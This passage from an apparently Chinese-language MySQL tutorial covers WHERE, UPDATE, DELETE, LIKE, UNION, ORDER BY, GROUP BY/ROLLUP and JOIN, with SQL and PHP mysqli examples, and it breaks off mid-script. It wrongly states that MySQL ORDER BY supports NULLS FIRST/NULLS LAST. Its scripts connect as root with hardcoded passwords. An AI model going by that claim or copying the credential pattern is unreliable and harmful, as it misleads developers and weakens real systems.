<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM countries WHERE country_code IN (&#x27;US&#x27;, &#x27;CA&#x27;, &#x27;MX&#x27;);</span><br></pre></td></tr></table></figure>

<p>NOT 条件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM products WHERE NOT category = &#x27;Clothing&#x27;;</span><br></pre></td></tr></table></figure>

<p>BETWEEN 条件:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM orders WHERE order_date BETWEEN &#x27;2023-01-01&#x27; AND &#x27;2023-12-31&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="从命令提示符中读取数据"><a href="#从命令提示符中读取数据" class="headerlink" title="从命令提示符中读取数据"></a>从命令提示符中读取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * from runoob_tbl WHERE runoob_author=&#x27;菜鸟教程&#x27;;</span><br></pre></td></tr></table></figure>

<p>MySQL 的 WHERE 子句的字符串比较是不区分大小写的。 你可以使用 BINARY 关键字来设定 WHERE 子句的字符串比较是区分大小写的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * from runoob_tbl WHERE BINARY runoob_author=&#x27;runoob.com&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本读取数据"><a href="#使用-PHP-脚本读取数据" class="headerlink" title="使用 PHP 脚本读取数据"></a>使用 PHP 脚本读取数据</h3><p>以下实例将从 runoob_tbl 表中返回使用 runoob_author 字段值为 <strong>RUNOOB.COM</strong> 的记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">// 读取 runoob_author 为 RUNOOB.COM 的数据</span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        WHERE runoob_author=&quot;RUNOOB.COM&quot;&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL WHERE 子句测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">// 释放内存</span><br><span class="line">mysqli_free_result($retval);</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-UPDATE-更新"><a href="#MySQL-UPDATE-更新" class="headerlink" title="MySQL UPDATE 更新"></a>MySQL UPDATE 更新</h2><p>使用 <strong>UPDATE</strong> 命令修改或更新 MySQL 中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">SET column1 = value1, column2 = value2, ...</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>table_name</code> 是你要更新数据的表的名称。</li>
<li><code>column1</code>, <code>column2</code>, … 是你要更新的列的名称。</li>
<li><code>value1</code>, <code>value2</code>, … 是新的值，用于替换旧的值。</li>
<li><code>WHERE condition</code> 是一个可选的子句，用于指定更新的行。如果省略 <code>WHERE</code> 子句，将更新表中的所有行。</li>
</ul>
<h3 id="通过命令提示符更新数据"><a href="#通过命令提示符更新数据" class="headerlink" title="通过命令提示符更新数据"></a>通过命令提示符更新数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE runoob_tbl SET runoob_title=&#x27;学习 C++&#x27; WHERE runoob_id=3;</span><br></pre></td></tr></table></figure>

<h3 id="使用PHP脚本更新数据"><a href="#使用PHP脚本更新数据" class="headerlink" title="使用PHP脚本更新数据"></a>使用PHP脚本更新数据</h3><p>不使用 WHERE 子句将会对数据表的全部数据进行更新</p>
<p>以下实例将更新 runoob_id 为 3 的 runoob_title 字段的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;UPDATE runoob_tbl</span><br><span class="line">        SET runoob_title=&quot;学习 Python&quot;</span><br><span class="line">        WHERE runoob_id=3&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法更新数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据更新成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-DELETE-语句"><a href="#MySQL-DELETE-语句" class="headerlink" title="MySQL DELETE 语句"></a>MySQL DELETE 语句</h2><p>用 <strong>DELETE FROM</strong> 命令来删除 MySQL 数据表中的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name</span><br><span class="line">WHERE condition;</span><br></pre></td></tr></table></figure>

<h3 id="从命令行中删除数据"><a href="#从命令行中删除数据" class="headerlink" title="从命令行中删除数据"></a>从命令行中删除数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM runoob_tbl WHERE runoob_id=3;</span><br></pre></td></tr></table></figure>

<h3 id="使用-PHP-脚本删除数据"><a href="#使用-PHP-脚本删除数据" class="headerlink" title="使用 PHP 脚本删除数据"></a>使用 PHP 脚本删除数据</h3><p>以下实例将删除 runoob_tbl 表中 runoob_id 为3 的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;root&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;DELETE FROM runoob_tbl</span><br><span class="line">        WHERE runoob_id=3&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法删除数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;数据删除成功！&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-LIKE-子句"><a href="#MySQL-LIKE-子句" class="headerlink" title="MySQL LIKE 子句"></a>MySQL LIKE 子句</h2><p><strong>LIKE</strong> 子句是在 MySQL 中用于在 WHERE 子句中进行模糊匹配的关键字。它通常与通配符一起使用，用于搜索符合某种模式的字符串</p>
<p><strong>LIKE</strong> 子句中使用百分号 **%**字符来表示任意字符，如果没有使用百分号 <strong>%</strong>, LIKE 子句与等号 <strong>&#x3D;</strong> 的效果是一样的</p>
<p><strong>%</strong> 通配符表示零个或多个字符。例如，**’a%’** 匹配以字母 <strong>‘a’</strong> 开头的任何字符串</p>
<p><strong>_</strong> 通配符表示一个字符。例如，**’_r%’** 匹配第二个字母为 <strong>‘r’</strong> 的任何字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE column_name LIKE pattern;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>column1</code>, <code>column2</code>, … 是你要选择的列的名称，如果使用 <code>*</code> 表示选择所有列。</li>
<li><code>table_name</code> 是你要从中查询数据的表的名称。</li>
<li><code>column_name</code> 是你要应用 <code>LIKE</code> 子句的列的名称。</li>
<li><code>pattern</code> 是用于匹配的模式，可以包含通配符。</li>
</ul>
<h3 id="在命令提示符中使用-LIKE-子句"><a href="#在命令提示符中使用-LIKE-子句" class="headerlink" title="在命令提示符中使用 LIKE 子句"></a>在命令提示符中使用 LIKE 子句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * from runoob_tbl  WHERE runoob_author LIKE &#x27;%COM&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="在-PHP-脚本中使用-LIKE-子句"><a href="#在-PHP-脚本中使用-LIKE-子句" class="headerlink" title="在 PHP 脚本中使用 LIKE 子句"></a>在 PHP 脚本中使用 LIKE 子句</h3><p>以下是我们使用PHP脚本在 runoob_tbl 表中读取 runoob_author 字段中以 COM 为结尾的的所有记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        WHERE runoob_author LIKE &quot;%COM&quot;&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 mysqli_fetch_array 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-UNION-操作符"><a href="#MySQL-UNION-操作符" class="headerlink" title="MySQL UNION 操作符"></a>MySQL UNION 操作符</h2><p>MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合，并去除重复的行(从表中选取所有<strong>不同</strong>值组合在一起)</p>
<p>UNION 操作符必须由两个或多个 SELECT 语句组成，每个 SELECT 语句的列数和对应位置的数据类型必须相同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table1</span><br><span class="line">WHERE condition1</span><br><span class="line">UNION</span><br><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table2</span><br><span class="line">WHERE condition2</span><br><span class="line">[ORDER BY column1, column2, ...];</span><br></pre></td></tr></table></figure>

<p><code>ORDER BY</code> 子句是一个可选的子句，用于指定合并后的结果集的排序顺序</p>
<p> 使用 UNION ALL 不去除重复行</p>
<h2 id="MySQL-ORDER-BY-排序-语句"><a href="#MySQL-ORDER-BY-排序-语句" class="headerlink" title="MySQL ORDER BY(排序) 语句"></a>MySQL ORDER BY(排序) 语句</h2><p>MySQL <strong>ORDER BY(排序)</strong> 语句可以按照一个或多个列的值进行升序（<strong>ASC</strong>）或降序（<strong>DESC</strong>）排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table_name</span><br><span class="line">ORDER BY column1 [ASC | DESC], column2 [ASC | DESC], ...;</span><br></pre></td></tr></table></figure>

<p>可以使用 NULLS FIRST 或 NULLS LAST 处理 NULL 值</p>
<h3 id="在命令提示符中使用-ORDER-BY-子句"><a href="#在命令提示符中使用-ORDER-BY-子句" class="headerlink" title="在命令提示符中使用 ORDER BY 子句"></a>在命令提示符中使用 ORDER BY 子句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * from runoob_tbl ORDER BY submission_date ASC;</span><br></pre></td></tr></table></figure>

<p>读取 runoob_tbl 表中所有数据并按 submission_date 字段的升序排列</p>
<h3 id="在-PHP-脚本中使用-ORDER-BY-子句"><a href="#在-PHP-脚本中使用-ORDER-BY-子句" class="headerlink" title="在 PHP 脚本中使用 ORDER BY 子句"></a>在 PHP 脚本中使用 ORDER BY 子句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT runoob_id, runoob_title, </span><br><span class="line">        runoob_author, submission_date</span><br><span class="line">        FROM runoob_tbl</span><br><span class="line">        ORDER BY  submission_date ASC&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL ORDER BY 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;标题&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;提交日期&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_title&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;submission_date&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;/tr&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;/table&gt;&#x27;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-GROUP-BY-语句"><a href="#MySQL-GROUP-BY-语句" class="headerlink" title="MySQL GROUP BY 语句"></a>MySQL GROUP BY 语句</h2><p>GROUP BY 语句根据一个或多个列对结果集进行分组。</p>
<p>在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, aggregate_function(column2)</span><br><span class="line">FROM table_name</span><br><span class="line">WHERE condition</span><br><span class="line">GROUP BY column1;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>column1</code>：指定分组的列。</li>
<li><code>aggregate_function(column2)</code>：对分组后的每个组执行的聚合函数。</li>
<li><code>table_name</code>：要查询的表名。</li>
<li><code>condition</code>：可选，用于筛选结果的条件。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET NAMES utf8;</span><br><span class="line">SET FOREIGN_KEY_CHECKS = 0;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">--  Table structure for `employee_tbl`</span><br><span class="line">-- ----------------------------</span><br><span class="line">DROP TABLE IF EXISTS `employee_tbl`;</span><br><span class="line">CREATE TABLE `employee_tbl` (</span><br><span class="line">  `id` INT(11) NOT NULL,</span><br><span class="line">  `name` CHAR(10) NOT NULL DEFAULT &#x27;&#x27;,</span><br><span class="line">  `date` datetime NOT NULL,</span><br><span class="line">  `signin` tinyint(4) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;登录次数&#x27;,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">-- ----------------------------</span><br><span class="line">--  Records of `employee_tbl`</span><br><span class="line">-- ----------------------------</span><br><span class="line">BEGIN;</span><br><span class="line">INSERT INTO `employee_tbl` VALUES (&#x27;1&#x27;, &#x27;小明&#x27;, &#x27;2016-04-22 15:25:33&#x27;, &#x27;1&#x27;), (&#x27;2&#x27;, &#x27;小王&#x27;, &#x27;2016-04-20 15:25:47&#x27;, &#x27;3&#x27;), (&#x27;3&#x27;, &#x27;小丽&#x27;, &#x27;2016-04-19 15:26:02&#x27;, &#x27;2&#x27;), (&#x27;4&#x27;, &#x27;小王&#x27;, &#x27;2016-04-07 15:26:14&#x27;, &#x27;4&#x27;), (&#x27;5&#x27;, &#x27;小明&#x27;, &#x27;2016-04-11 15:26:40&#x27;, &#x27;4&#x27;), (&#x27;6&#x27;, &#x27;小明&#x27;, &#x27;2016-04-04 15:26:54&#x27;, &#x27;2&#x27;);</span><br><span class="line">COMMIT;</span><br><span class="line"></span><br><span class="line">SET FOREIGN_KEY_CHECKS = 1;</span><br></pre></td></tr></table></figure>

<p>导入成功后，执行以下 SQL 语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set names utf8;</span><br><span class="line">mysql&gt; SELECT * FROM employee_tbl;</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">| id | name   | date                | signin |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">|  1 | 小明 | 2016-04-22 15:25:33 |      1 |</span><br><span class="line">|  2 | 小王 | 2016-04-20 15:25:47 |      3 |</span><br><span class="line">|  3 | 小丽 | 2016-04-19 15:26:02 |      2 |</span><br><span class="line">|  4 | 小王 | 2016-04-07 15:26:14 |      4 |</span><br><span class="line">|  5 | 小明 | 2016-04-11 15:26:40 |      4 |</span><br><span class="line">|  6 | 小明 | 2016-04-04 15:26:54 |      2 |</span><br><span class="line">+----+--------+---------------------+--------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 GROUP BY 语句 将数据表按名字进行分组，并统计每个人有多少条记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name, COUNT(*) FROM   employee_tbl GROUP BY name;</span><br><span class="line">+--------+----------+</span><br><span class="line">| name   | COUNT(*) |</span><br><span class="line">+--------+----------+</span><br><span class="line">| 小丽 |        1 |</span><br><span class="line">| 小明 |        3 |</span><br><span class="line">| 小王 |        2 |</span><br><span class="line">+--------+----------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。</p>
<p>例如我们将以上的数据表按名字进行分组，再统计每个人登录的次数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT name, SUM(signin) as signin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------+--------------+</span><br><span class="line">| name   | signin_count |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| 小丽 |            2 |</span><br><span class="line">| 小明 |            7 |</span><br><span class="line">| 小王 |            7 |</span><br><span class="line">| NULL   |           16 |</span><br><span class="line">+--------+--------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中记录 NULL 表示所有人的登录次数。</p>
<p>我们可以使用 coalesce 来设置一个可以取代 NUll 的名称，coalesce 语法：</p>
<p>果 a&#x3D;&#x3D;null，则选择 b；如果 b&#x3D;&#x3D;null,则选择 c；如果 a!&#x3D;null,则选择 a；如果 a b c 都为 null ，则返回为 null（没意义）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select coalesce(a,b,c);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT coalesce(name, &#x27;总数&#x27;), SUM(signin) as signin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| coalesce(name, &#x27;总数&#x27;) | signin_count |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">| 小丽                   |            2 |</span><br><span class="line">| 小明                   |            7 |</span><br><span class="line">| 小王                   |            7 |</span><br><span class="line">| 总数                   |           16 |</span><br><span class="line">+--------------------------+--------------+</span><br><span class="line">4 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<h2 id="MySQL-连接的使用"><a href="#MySQL-连接的使用" class="headerlink" title="MySQL 连接的使用"></a>MySQL 连接的使用</h2><p>使用 MySQL 的 JOIN 在两个或多个表中查询数据</p>
<h3 id="JOIN-按功能分类"><a href="#JOIN-按功能分类" class="headerlink" title="JOIN 按功能分类"></a>JOIN 按功能分类</h3><h4 id="INNER-JOIN"><a href="#INNER-JOIN" class="headerlink" title="INNER JOIN"></a>INNER JOIN</h4><p>返回两个表中满足连接条件的匹配行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table1</span><br><span class="line">INNER JOIN table2 ON table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<p><code>table1.column_name = table2.column_name</code> 是连接条件，指定了两个表中用于匹配的列</p>
<h4 id="LEFT-JOIN"><a href="#LEFT-JOIN" class="headerlink" title="LEFT JOIN"></a>LEFT JOIN</h4><p>返回左表的所有行，并包括右表中匹配的行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table1</span><br><span class="line">LEFT JOIN table2 ON table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<h4 id="RIGHT-JOIN"><a href="#RIGHT-JOIN" class="headerlink" title="RIGHT JOIN"></a>RIGHT JOIN</h4><p>返回右表的所有行，并包括左表中匹配的行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column1, column2, ...</span><br><span class="line">FROM table1</span><br><span class="line">RIGHT JOIN table2 ON table1.column_name = table2.column_name;</span><br></pre></td></tr></table></figure>

<h3 id="在命令提示符中使用-INNER-JOIN"><a href="#在命令提示符中使用-INNER-JOIN" class="headerlink" title="在命令提示符中使用 INNER JOIN"></a>在命令提示符中使用 INNER JOIN</h3><p>如在 RUNOOB 数据库中有两张表 tcount_tbl 和 runoob_tbl</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a, tcount_tbl b WHERE a.runoob_author = b.runoob_author;</span><br></pre></td></tr></table></figure>

<h3 id="在-PHP-脚本中使用-JOIN"><a href="#在-PHP-脚本中使用-JOIN" class="headerlink" title="在 PHP 脚本中使用 JOIN"></a>在 PHP 脚本中使用 JOIN</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost = &#x27;localhost&#x27;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &#x27;root&#x27;;            // mysql用户名</span><br><span class="line">$dbpass = &#x27;123456&#x27;;          // mysql用户名密码</span><br><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;连接失败: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn , &quot;set names utf8&quot;);</span><br><span class="line"> </span><br><span class="line">$sql = &#x27;SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author = b.runoob_author&#x27;;</span><br><span class="line"> </span><br><span class="line">mysqli_select_db( $conn, &#x27;RUNOOB&#x27; );</span><br><span class="line">$retval = mysqli_query( $conn, $sql );</span><br><span class="line">if(! $retval )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#x27;无法读取数据: &#x27; . mysqli_error($conn));</span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;&lt;h2&gt;菜鸟教程 MySQL JOIN 测试&lt;h2&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt;&lt;td&gt;教程 ID&lt;/td&gt;&lt;td&gt;作者&lt;/td&gt;&lt;td&gt;登陆次数&lt;/td&gt;&lt;/tr&gt;&#x27;;</span><br><span class="line">while($row = mysqli_fetch_array($retval, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#x27;runoob_id&#x27;]&#125;&lt;/td&gt; &quot;.</span><br><span class="line">         &quot;&lt;td&gt;&#123;$row[&#x27;runoob_author&#x27;]&#125; &lt;/td&gt; &quot;.</span><br><span class="line">         